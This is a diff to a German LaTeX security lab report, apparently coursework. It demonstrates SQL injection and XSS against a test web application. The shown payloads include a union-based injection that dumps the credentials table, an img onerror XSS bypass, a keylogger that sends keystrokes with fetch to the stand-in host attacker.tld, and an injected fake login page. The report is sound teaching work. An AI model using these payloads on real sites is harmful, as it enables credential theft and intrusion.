@@ -337,7 +337,7 @@ Um die Anfälligkeit der Webanwendung für SQL Injection zu testen, wurde ein An
     \label{fig:sql-login-error-response}
 \end{figure}
 
-\noindent Mit diesem Wissen wurde eine angepasste Injection erstellt.
+\noindent Mit diesem Wissen wurde eine angepasste Injection erstellt:
 \begin{lstlisting}[breaklines]
 ' union select 1,'itsec','attack'; -- '
 \end{lstlisting}
@@ -357,11 +357,11 @@ Diese Eingabe als Benutzername, kombiniert mit \lstinline|attack| als Passwort, 
     \label{fig:sql-injection-login-success}
 \end{figure}
 
-\noindent Um die Möglichkeiten der SQL Injection weiter zu demonstrieren, wurde eine alternative Injection entwickelt, um alle Benutzerdaten zu extrahieren.
+\noindent Um die Möglichkeiten der SQL Injection weiter zu demonstrieren, wurde eine alternative Injection entwickelt, um alle Benutzerdaten zu extrahieren:
 \begin{lstlisting}[breaklines]
 ' union select 1, group_concat(concat_ws('|', user, password) separator ', '), 'attack' from credentials -- '
 \end{lstlisting}
-Diese wird ebenfalls als Benutzername eingegeben und \lstinline|attack| als Passwort verwendet. Unser Benutzername in der Webanwendung enthält nun alle extrahierten Daten aus der Datenbanktabelle.
+Diese Injection wird ebenfalls als Benutzername eingegeben, während \lstinline|attack| wieder als Passwort verwendet wird. Als Ergebnis enthält der angezeigte Benutzername in der Webanwendung nun alle extrahierten Daten aus der Datenbanktabelle, wie in der folgenden Abbildung zu sehen ist:
 
 \begin{figure}[H]
     \centering
@@ -375,7 +375,10 @@ Diese wird ebenfalls als Benutzername eingegeben und \lstinline|attack| als Pass
 \subsection{Cross-Site Scripting}
 Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstrieren, wurden verschiedene Methoden der Code-Injektion in das Message Board getestet, das nach erfolgreicher Anmeldung zugänglich ist.
 
-\noindent Zunächst wurde ein einfacher JavaScript-Code injiziert: \lstinline|<script>alert('test')</script>|
+\noindent Zunächst wurde ein einfacher JavaScript-Code injiziert, der eine Alert-Box mit dem Text \lstinline|test| anzeigen sollte:
+\begin{lstlisting}[breaklines]
+<script>alert('test')</script>
+\end{lstlisting}
 
 \begin{figure}[H]
     \centering
@@ -384,7 +387,9 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
     \label{fig:xss-script-injection-fail}
 \end{figure}
 
-\noindent Dieser Code wurde zwar in den HTML-Quelltext eingefügt, aber von Firefox ignoriert, was an der grauen Hinterlegung im Quelltext erkennbar war.
+\noindent Trotz erfolgreicher Injektion des Codes geschah jedoch nichts Sichtbares auf der Webseite.
+
+\noindent Bei näherer Untersuchung zeigte sich, dass der Code zwar in den HTML-Quelltext eingefügt wurde, aber von Firefox ignoriert wurde. Dies war an der grauen Hinterlegung im Quelltext erkennbar, wie die folgende Abbildung zeigt:
 
 \begin{figure}[H]
     \centering
@@ -393,7 +398,7 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
     \label{fig:xss-script-injection-html}
 \end{figure}
 
-\noindent Als Alternative wurde ein <img>-Tag mit dem onerror-Attribut verwendet.
+\noindent Als Alternative wurde ein <img>-Tag mit dem onerror-Attribut verwendet. Diese Methode zielt darauf ab, JavaScript-Code auszuführen, wenn das Laden eines Bildes fehlschlägt:
 \begin{lstlisting}[breaklines]
 <img src="" onerror=alert('test')>
 \end{lstlisting}
@@ -405,14 +410,18 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
     \label{fig:xss-img-tag-injection-success}
 \end{figure}
 
-\noindent Diese Methode war erfolgreich und löste wie erwartet ein Alert-Fenster aus.
+\noindent Wie in der Abbildung zu sehen ist, war diese Methode erfolgreich und löste wie erwartet ein Alert-Fenster aus.
 
 \noindent Um die Schwere der XSS-Schwachstelle zu verdeutlichen, wurden zwei Angriffsvektoren getestet.
 
-\noindent Zunächst wurde ein Keylogger eingesetzt, der jeden Tastendruck auf der Website aufzeichnet und an einen externen Server sendet.
+\noindent Zunächst wurde ein Keylogger eingesetzt, der jeden Tastendruck an einen externen Server sendet:
 \begin{lstlisting}[breaklines]
 <img src="" onerror="document.addEventListener('keypress', function(e) { fetch('http://attacker.tld?key=' + String.fromCharCode(e.which)); }); this.remove();">
 \end{lstlisting}
+
+\noindent Für diese Demonstration wurde die fiktive Adresse \lstinline|attacker.tld| als Zielserver verwendet.
+
+\noindent Der resultierende Netzwerkverkehr, der die gesendeten Tastendrücke zeigt, ist in der folgenden Abbildung dargestellt:
 
 \begin{figure}[H]
     \centering
@@ -421,7 +430,7 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
     \label{fig:xss-keylogger-network-traffic}
 \end{figure}
 
-\noindent Dann wurde eine Phishing-Seite imitiert, die eine legitime Website nachahmt, um Benutzerdaten zu stehlen.
+\noindent Dann wurde eine Phishing-Seite imitiert, die eine legitime Website nachahmt, um Benutzerdaten zu stehlen:
 \begin{lstlisting}[breaklines]
 <img src="" onerror="(function(){
   document.body.innerHTML = `
@@ -442,12 +451,16 @@ Um die Cross-Site Scripting (XSS) Schwachstelle der Webanwendung zu demonstriere
 }())">
 \end{lstlisting}
 
+\noindent Diese Injektion ersetzt den gesamten Inhalt der Webseite durch eine Login-Maske, die Benutzer zur Eingabe ihrer Anmeldedaten verleiten könnte. Das Ergebnis dieser Injektion ist in der folgenden Abbildung dargestellt:
+
 \begin{figure}[H]
     \centering
     \includegraphics[width=17cm]{xss-phishing-page-injection.png}
     \caption{Darstellung der XSS-injizierten Phishing-Seite}
     \label{fig:xss-phishing-page-injection}
 \end{figure}
+
+\noindent Wie man sehen kann, wurde die ursprüngliche Webseite vollständig durch eine gefälschte Login-Maske ersetzt. Dies verdeutlicht das erhebliche Risiko, das von XSS-Schwachstellen ausgeht.
 
 \FloatBarrier
 
